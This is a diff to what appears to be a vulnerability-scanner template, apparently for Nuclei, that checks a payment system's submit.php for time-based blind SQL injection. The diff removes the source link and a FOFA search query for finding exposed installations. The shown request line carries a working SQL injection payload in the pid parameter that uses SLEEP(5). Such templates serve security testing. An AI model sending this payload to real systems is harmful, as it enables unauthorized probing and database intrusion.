@@ -3,14 +3,8 @@ info:
   name: 码⽀付存在前台submit.php存在SQL注⼊漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wla2v8sbbg88np9e
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wla2v8sbbg88np9e
-    fofa: '"/epaydoc/epaydoc.php"'
 http:
 - raw:
   - 'GET /submit.php?pid=''+AND+(SELECT+1537+FROM+(SELECT(SLEEP(5)))VpjZ)--+CSLx HTTP/1.1
